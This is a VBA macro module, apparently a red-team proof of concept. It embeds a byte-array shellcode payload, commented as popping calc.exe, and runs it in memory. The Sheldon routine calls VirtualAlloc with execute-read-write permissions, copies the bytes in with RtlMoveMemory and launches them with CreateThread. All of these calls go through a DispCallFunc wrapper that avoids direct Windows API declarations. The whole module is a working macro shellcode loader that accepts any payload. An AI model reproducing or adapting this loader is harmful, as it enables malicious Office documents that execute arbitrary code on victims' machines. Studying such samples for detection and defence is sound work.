Attribute VB_Name = "Module1"
Declare PtrSafe Function DispCallFunc Lib "OleAut32.dll" (ByVal pvInstance As Long, ByVal offsetinVft As Long, ByVal CallConv As Long, ByVal retTYP As Integer, ByVal paCNT As Long, ByRef paTypes As Integer, ByRef paValues As Long, ByRef retVAR As Variant) As Long
Declare PtrSafe Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (ByVal lpLibFileName As String) As Long
Declare PtrSafe Function GetProcAddress Lib "kernel32" (ByVal hModule As Long, ByVal lpProcName As String) As Long

Const CC_STDCALL = 4
Const MEM_COMMIT = &H1000
Const PAGE_EXECUTE_READWRITE = &H40

Private VType(0 To 63) As Integer, VPtr(0 To 63) As Long

'Credits
'http://exceldevelopmentplatform.blogspot.com/2017/05/dispcallfunc-opens-new-door-to-com.html
'http://www.freevbcode.com/ShowCode.asp?ID=1863
  
Sub Sheldon()
    
    Dim lpMemory As Long
    Dim lResult As Long
    
    'Shellcode pops calc.exe
    ShellCode = Array(Chr(&HDA), Chr(&HD5), Chr(&HB8), Chr(&H2E), Chr(&H72), Chr(&H68), Chr(&H42), Chr(&HD9), Chr(&H74), Chr(&H24), Chr(&HF4), Chr(&H5B), Chr(&H31), Chr(&HC9), Chr(&HB1), _
            Chr(&H31), Chr(&H83), Chr(&HEB), Chr(&HFC), Chr(&H31), Chr(&H43), Chr(&H14), Chr(&H3), Chr(&H43), Chr(&H3A), Chr(&H90), Chr(&H9D), Chr(&HBE), Chr(&HAA), Chr(&HD6), _
            Chr(&H5E), Chr(&H3F), Chr(&H2A), Chr(&HB7), Chr(&HD7), Chr(&HDA), Chr(&H1B), Chr(&HF7), Chr(&H8C), Chr(&HAF), Chr(&HB), Chr(&HC7), Chr(&HC7), Chr(&HE2), Chr(&HA7), _
            Chr(&HAC), Chr(&H8A), Chr(&H16), Chr(&H3C), Chr(&HC0), Chr(&H2), Chr(&H18), Chr(&HF5), Chr(&H6F), Chr(&H75), Chr(&H17), Chr(&H6), Chr(&HC3), Chr(&H45), Chr(&H36), _
            Chr(&H84), Chr(&H1E), Chr(&H9A), Chr(&H98), Chr(&HB5), Chr(&HD0), Chr(&HEF), Chr(&HD9), Chr(&HF2), Chr(&HD), Chr(&H1D), Chr(&H8B), Chr(&HAB), Chr(&H5A), Chr(&HB0), _
            Chr(&H3C), Chr(&HD8), Chr(&H17), Chr(&H9), Chr(&HB6), Chr(&H92), Chr(&HB6), Chr(&H9), Chr(&H2B), Chr(&H62), Chr(&HB8), Chr(&H38), Chr(&HFA), Chr(&HF9), Chr(&HE3), _
            Chr(&H9A), Chr(&HFC), Chr(&H2E), Chr(&H98), Chr(&H92), Chr(&HE6), Chr(&H33), Chr(&HA5), Chr(&H6D), Chr(&H9C), Chr(&H87), Chr(&H51), Chr(&H6C), Chr(&H74), Chr(&HD6), _
            Chr(&H9A), Chr(&HC3), Chr(&HB9), Chr(&HD7), Chr(&H68), Chr(&H1D), Chr(&HFD), Chr(&HDF), Chr(&H92), Chr(&H68), Chr(&HF7), Chr(&H1C), Chr(&H2E), Chr(&H6B), Chr(&HCC), _
            Chr(&H5F), Chr(&HF4), Chr(&HFE), Chr(&HD7), Chr(&HC7), Chr(&H7F), Chr(&H58), Chr(&H3C), Chr(&HF6), Chr(&HAC), Chr(&H3F), Chr(&HB7), Chr(&HF4), Chr(&H19), Chr(&H4B), _
            Chr(&H9F), Chr(&H18), Chr(&H9F), Chr(&H98), Chr(&HAB), Chr(&H24), Chr(&H14), Chr(&H1F), Chr(&H7C), Chr(&HAD), Chr(&H6E), Chr(&H4), Chr(&H58), Chr(&HF6), Chr(&H35), _
            Chr(&H25), Chr(&HF9), Chr(&H52), Chr(&H9B), Chr(&H5A), Chr(&H19), Chr(&H3D), Chr(&H44), Chr(&HFF), Chr(&H51), Chr(&HD3), Chr(&H91), Chr(&H72), Chr(&H38), Chr(&HB9), _
            Chr(&H64), Chr(&H0), Chr(&H46), Chr(&H8F), Chr(&H67), Chr(&H1A), Chr(&H49), Chr(&HBF), Chr(&HF), Chr(&H2B), Chr(&HC2), Chr(&H50), Chr(&H57), Chr(&HB4), Chr(&H1), _
            Chr(&H15), Chr(&HA7), Chr(&HFE), Chr(&H8), Chr(&H3F), Chr(&H20), Chr(&HA7), Chr(&HD8), Chr(&H2), Chr(&H2D), Chr(&H58), Chr(&H37), Chr(&H40), Chr(&H48), Chr(&HDB), _
            Chr(&HB2), Chr(&H38), Chr(&HAF), Chr(&HC3), Chr(&HB6), Chr(&H3D), Chr(&HEB), Chr(&H43), Chr(&H2A), Chr(&H4F), Chr(&H64), Chr(&H26), Chr(&H4C), Chr(&HFC), Chr(&H85), _
            Chr(&H63), Chr(&H2F), Chr(&H63), Chr(&H16), Chr(&HEF), Chr(&H9E), Chr(&H6), Chr(&H9E), Chr(&H8A), Chr(&HDE))
    
    lpMemory = stdCallA("kernel32", "VirtualAlloc", vbLong, 0&, UBound(ShellCode), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    
    For iArray = LBound(ShellCode) To UBound(ShellCode)
        bytestowrite = ShellCode(iArray)
        lResult = stdCallA("kernel32", "RtlMoveMemory", vbLong, lpMemory + iArray, bytestowrite, 1)
    Next iArray
   
    lResult = stdCallA("kernel32", "CreateThread", vbLong, 0&, 0&, lpMemory, 0&, 0&, 0&)

End Sub

Public Function stdCallA(sDll As String, sFunc As String, ByVal RetType As VbVarType, ParamArray P() As Variant)

    Dim i As Long, pFunc As Long, V(), HRes As Long
    ReDim V(0)
  
    V = P
    
    For i = 0 To UBound(V)
        If VarType(P(i)) = vbString Then P(i) = StrConv(P(i), vbFromUnicode): V(i) = StrPtr(P(i))
            VType(i) = VarType(V(i))
            VPtr(i) = VarPtr(V(i))
        Next i
  
    HRes = DispCallFunc(0, GetProcAddress(LoadLibrary(sDll), sFunc), CC_STDCALL, RetType, i, VType(0), VPtr(0), stdCallA)
  
End Function
